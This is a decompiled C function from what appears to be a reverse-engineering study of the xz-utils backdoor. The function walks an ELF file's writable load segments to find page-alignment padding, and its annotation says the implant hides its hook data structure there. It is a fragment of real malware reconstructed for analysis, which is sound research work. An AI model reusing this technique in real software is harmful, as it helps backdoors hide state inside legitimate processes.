// /home/kali/xzre-ghidra/xzregh/102150_elf_get_data_segment.c
// Function: elf_get_data_segment @ 0x102150
// Calling convention: __stdcall
// Prototype: void * __stdcall elf_get_data_segment(elf_info_t * elf_info, u64 * pSize, BOOL get_alignment)


/*
 * AutoDoc: Walks every PT_LOAD segment looking for the last read/write mapping (PF_W|PF_R). Once found it caches three pieces of
 * information: the base of the mapped data (`data_segment_start`), the amount of padding between the end of the file-backed bytes
 * and the next page boundary (`data_segment_alignment`), and the total size of the aligned segment. Callers either request the
 * true segment span (`get_alignment == FALSE`) or the padding region (when TRUE), which is where the implant later tucks the
 * `backdoor_hooks_data_t` structure.
 */

#include "xzre_types.h"

void * elf_get_data_segment(elf_info_t *elf_info,u64 *pSize,BOOL get_alignment)

{
  Elf64_Ehdr *elfbase;
  BOOL data_segment_found;
  ulong best_segment_index;
  Elf64_Phdr *phdr;
  void *segment_file_end;
  void *cached_data_start;
  u64 alignment_size;
  ulong best_segment_start;
  ulong seg_start;
  void *segment_mem_end;
  ulong phdr_index;
  ulong seg_end;
  u64 best_segment_span;
  
  cached_data_start = (void *)elf_info->data_segment_start;
  elfbase = elf_info->elfbase;
  if (cached_data_start != (void *)0x0) {
    if (get_alignment != FALSE) {
      alignment_size = elf_info->data_segment_padding;
      *pSize = alignment_size;
      cached_data_start = (void *)((long)cached_data_start - alignment_size);
      if (alignment_size == 0) {
        cached_data_start = (void *)0x0;
      }
      return cached_data_start;
    }
    *pSize = elf_info->data_segment_size;
    return cached_data_start;
  }
  data_segment_found = FALSE;
  best_segment_span = 0;
  best_segment_start = 0;
  best_segment_index = 0;
  for (phdr_index = 0; (uint)phdr_index < (uint)(ushort)elf_info->phdr_count; phdr_index = phdr_index + 1) {
    phdr = elf_info->phdrs + phdr_index;
    if ((phdr->p_type == 1) && ((phdr->p_flags & 7) == 6)) {
      if (phdr->p_memsz < phdr->p_filesz) {
        return (void *)0x0;
      }
      seg_start = (long)elfbase + (phdr->p_vaddr - elf_info->load_base_vaddr);
      seg_end = phdr->p_memsz + seg_start;
      seg_start = seg_start & 0xfffffffffffff000;
      if ((seg_end & 0xfff) != 0) {
        seg_end = (seg_end & 0xfffffffffffff000) + 0x1000;
      }
      if (data_segment_found) {
        if (best_segment_start + best_segment_span < seg_end) {
          best_segment_span = seg_end - seg_start;
          best_segment_index = phdr_index & 0xffffffff;
          best_segment_start = seg_start;
        }
      }
      else {
        best_segment_span = seg_end - seg_start;
        data_segment_found = TRUE;
        best_segment_index = phdr_index & 0xffffffff;
        best_segment_start = seg_start;
      }
    }
  }
  if (data_segment_found) {
    phdr = elf_info->phdrs;
    best_segment_span = phdr[best_segment_index].p_vaddr - elf_info->load_base_vaddr;
    segment_mem_end = (void *)((long)elfbase + phdr[best_segment_index].p_memsz + best_segment_span);
    segment_file_end = (void *)((long)elfbase + phdr[best_segment_index].p_filesz + best_segment_span);
    cached_data_start = segment_mem_end;
    if (((ulong)segment_mem_end & 0xfff) != 0) {
      cached_data_start = (void *)(((ulong)segment_mem_end & 0xfffffffffffff000) + 0x1000);
    }
    alignment_size = (long)cached_data_start - (long)segment_mem_end;
    elf_info->data_segment_start = (u64)segment_file_end;
    elf_info->data_segment_padding = alignment_size;
    elf_info->data_segment_size = (long)cached_data_start - (long)segment_file_end;
    if (get_alignment == FALSE) {
      *pSize = (long)cached_data_start - (long)segment_file_end;
      return segment_file_end;
    }
    *pSize = alignment_size;
    if (alignment_size != 0) {
      return segment_mem_end;
    }
  }
  return (void *)0x0;
}

